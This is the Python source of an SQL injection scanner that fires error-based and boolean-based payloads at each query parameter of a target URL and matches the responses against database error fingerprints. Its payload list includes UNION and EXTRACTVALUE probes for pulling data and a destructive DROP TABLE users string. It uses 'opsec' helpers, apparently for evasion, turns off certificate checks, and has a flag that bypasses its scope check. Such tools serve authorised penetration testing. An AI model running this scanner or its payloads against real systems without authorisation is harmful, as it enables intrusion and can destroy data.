"""
tools/sqli_tester.py
SQL Injection tester — error-based + boolean-based detection.

For each URL parameter the scanner:
  1. Injects error-triggering payloads and searches the response body
     for known database error strings.
  2. Runs a boolean-based differential test: injects `AND 1=1` (true)
     vs `AND 1=2` (false) and flags a significant response-length
     difference as a potential boolean SQLi indicator.
"""
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode
from dataclasses import dataclass, field
from security.validator import is_allowed_target
from opsec import get_headers, opsec_sleep

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_TIMEOUT = 10
_HEADERS = get_headers()

# ── Error-based payloads ──────────────────────────────────────────────────────
_ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    '" OR "1"="1',
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "'; DROP TABLE users--",
    "1; SELECT SLEEP(0)--",
    "1 AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
]

# ── Boolean-based probe templates (true / false) ─────────────────────────────
_BOOL_TRUE  = ["1 AND 1=1", "1' AND '1'='1", "1 AND 1=1--", "' OR 1=1--"]
_BOOL_FALSE = ["1 AND 1=2", "1' AND '1'='2", "1 AND 1=2--", "' OR 1=2--"]

# Minimum response-length difference (bytes) to flag a boolean finding
_BOOL_DIFF_THRESHOLD = 50

# ── DB error fingerprints ─────────────────────────────────────────────────────
_DB_ERRORS: list[tuple[str, str]] = [
    # MySQL
    ("you have an error in your sql syntax", "MySQL"),
    ("warning: mysql", "MySQL"),
    ("mysql_fetch_array()", "MySQL"),
    ("mysql_num_rows()", "MySQL"),
    ("supplied argument is not a valid mysql", "MySQL"),
    ("unclosed quotation mark after the character string", "MSSQL"),
    # MSSQL
    ("microsoft sql server", "MSSQL"),
    ("mssql_query()", "MSSQL"),
    ("odbc sql server driver", "MSSQL"),
    ("incorrect syntax near", "MSSQL"),
    ("nvarchar", "MSSQL"),
    # PostgreSQL
    ("pg_query()", "PostgreSQL"),
    ("unterminated quoted string at or near", "PostgreSQL"),
    ("postgresql", "PostgreSQL"),
    ("pg_exec() query failed", "PostgreSQL"),
    ("query failed: error: syntax error", "PostgreSQL"),
    # SQLite
    ("sqlite_", "SQLite"),
    ("sqlite3", "SQLite"),
    ("sqlite.exception", "SQLite"),
    ("no such table", "SQLite"),
    ("unable to open database file", "SQLite"),
    # Oracle
    ("ora-", "Oracle"),
    ("oracle error", "Oracle"),
    ("oracle.*driver", "Oracle"),
    ("quoted string not properly terminated", "Oracle"),
    # Generic
    ("syntax error", "Unknown"),
    ("sql syntax", "Unknown"),
    ("sql error", "Unknown"),
    ("database error", "Unknown"),
    ("db error", "Unknown"),
    ("sqlexception", "Unknown"),
    ("invalid query", "Unknown"),
]


@dataclass
class SQLiFinding:
    parameter:    str
    payload:      str
    db_type_hint: str
    confidence:   str        # "High" | "Medium"
    detail:       str


@dataclass
class SQLiResult:
    success:  bool
    target:   str
    findings: list[SQLiFinding] = field(default_factory=list)
    error:    str = ""

    @property
    def has_findings(self) -> bool:
        return bool(self.findings)

    @property
    def high_confidence(self) -> list[SQLiFinding]:
        return [f for f in self.findings if f.confidence == "High"]


def _extract_params(url: str) -> dict[str, list[str]]:
    return parse_qs(urlparse(url).query, keep_blank_values=True)


def _inject(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    return parsed._replace(query=urlencode(qs, doseq=True)).geturl()


def _check_db_error(body: str) -> tuple[str, str] | None:
    """Return (db_type, matched_pattern) if a DB error fingerprint is found."""
    body_lower = body.lower()
    for pattern, db_type in _DB_ERRORS:
        if pattern in body_lower:
            return db_type, pattern
    return None


def _get_response(url: str) -> requests.Response | None:
    try:
        resp = requests.get(
            url,
            headers=_HEADERS,
            timeout=_TIMEOUT,
            verify=False,
            allow_redirects=True,
        )
        opsec_sleep()
        return resp
    except Exception:
        return None


def scan_sqli(url: str, confirmed: bool = False) -> SQLiResult:
    """
    Test every query parameter of *url* for SQL injection.

    Strategy:
      - Error-based: inject payloads that break SQL syntax, look for
        DB error messages in the response body (High confidence).
      - Boolean-based: compare response length for AND 1=1 vs AND 1=2;
        a significant difference suggests blind SQLi (Medium confidence).

    Args:
        url:       Full URL with query parameters, e.g.
                   http://target.com/items?id=1
        confirmed: Skip scope check if authorisation already confirmed.

    Returns:
        SQLiResult with all findings.
    """
    parsed = urlparse(url)
    host = parsed.hostname or url

    if not confirmed and not is_allowed_target(host):
        return SQLiResult(
            success=False,
            target=url,
            error=f"Target '{host}' is outside the allowed scope.",
        )

    params = _extract_params(url)
    if not params:
        params = {"id": ["1"]}

    result = SQLiResult(success=True, target=url)
    seen: set[tuple[str, str]] = set()  # (param, confidence_type)

    for param in params:
        # ── Error-based detection ─────────────────────────────────────────────
        for payload in _ERROR_PAYLOADS:
            key = (param, payload)
            if key in seen:
                continue

            test_url = _inject(url, param, payload)
            resp = _get_response(test_url)
            if resp is None:
                if not result.error:
                    result.error = f"Request failed for param '{param}'"
                continue

            match = _check_db_error(resp.text)
            if match:
                db_type, pattern = match
                dedup = (param, "error")
                if dedup not in seen:
                    seen.add(dedup)
                    result.findings.append(SQLiFinding(
                        parameter=param,
                        payload=payload,
                        db_type_hint=db_type,
                        confidence="High",
                        detail=(
                            f"Database error detected in response. "
                            f"Matched pattern: '{pattern}'. "
                            f"Database engine hint: {db_type}."
                        ),
                    ))
                break  # one error finding per param is enough

        # ── Boolean-based detection ───────────────────────────────────────────
        dedup_bool = (param, "boolean")
        if dedup_bool in seen:
            continue

        for true_pl, false_pl in zip(_BOOL_TRUE, _BOOL_FALSE):
            resp_true  = _get_response(_inject(url, param, true_pl))
            resp_false = _get_response(_inject(url, param, false_pl))
            if resp_true is None or resp_false is None:
                continue

            len_true  = len(resp_true.text)
            len_false = len(resp_false.text)
            diff      = abs(len_true - len_false)

            if diff >= _BOOL_DIFF_THRESHOLD:
                seen.add(dedup_bool)
                result.findings.append(SQLiFinding(
                    parameter=param,
                    payload=f"{true_pl}  vs  {false_pl}",
                    db_type_hint="Unknown (blind)",
                    confidence="Medium",
                    detail=(
                        f"Boolean differential detected. "
                        f"TRUE condition response: {len_true}B, "
                        f"FALSE condition response: {len_false}B "
                        f"(diff: {diff}B). "
                        "Possible blind SQL injection — verify manually."
                    ),
                ))
                break

    return result
